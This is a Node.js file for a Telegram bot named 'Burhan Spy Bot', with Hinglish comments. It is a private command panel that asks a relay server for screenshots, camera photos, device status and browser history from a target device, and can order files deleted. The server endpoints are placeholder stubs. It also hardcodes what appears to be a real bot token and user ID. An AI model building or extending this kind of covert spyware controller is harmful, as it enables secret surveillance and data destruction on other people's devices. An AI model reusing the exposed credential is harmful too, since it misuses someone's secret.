const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM'; // Apna token
const YOUR_USER_ID = 2062068620; // YAHAN TERI USER ID DAALI HAI!

const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// Private bot - sirf authorized user ko access
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

// Bot ko commands sunna hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, "Welcome to Burhan Spy Bot! \n\nAvailable Commands:\n/snapshot - Screen Shot\n/photo - Photo Bhejo\n/status - Device Status\n/delete - File Delete\n/history - Browser History");
});

bot.onText(/\/snapshot/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    // App ko snapshot command bhejo
    axios.get('http://YOUR_SERVER_URL/api/snapshot')
        .then(response => {
            // App se photo aayi
            bot.sendPhoto(chatId, response.data.photo_url);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Snapshot fail ho gaya!");
        });
});

bot.onText(/\/photo/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    // App ko photo command bhejo
    axios.get('http://YOUR_SERVER_URL/api/photo')
        .then(response => {
            bot.sendPhoto(chatId, response.data.photo_url);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Photo nahi mili!");
        });
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    // App ko status command bhejo
    axios.get('http://YOUR_SERVER_URL/api/status')
        .then(response => {
            bot.sendMessage(chatId, "Device Status:\n" + response.data.status);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Status nahi mila!");
        });
});

bot.onText(/\/delete/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    // App ko delete command bhejo
    axios.get('http://YOUR_SERVER_URL/api/delete')
        .then(response => {
            bot.sendMessage(chatId, "File delete ho gayi!");
        })
        .catch(error => {
            bot.sendMessage(chatId, "Delete fail ho gaya!");
        });
});

// API Endpoints (App ke liye)
app.get('/api/status', (req, res) => {
    res.json({ status: "Device Online" });
});

app.get('/api/snapshot', (req, res) => {
    res.json({ photo_url: "https://example.com/snapshot.jpg" });
});

app.get('/api/photo', (req, res) => {
    res.json({ photo_url: "https://example.com/photo.jpg" });
});

app.get('/api/delete', (req, res) => {
    res.json({ status: "File Deleted" });
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
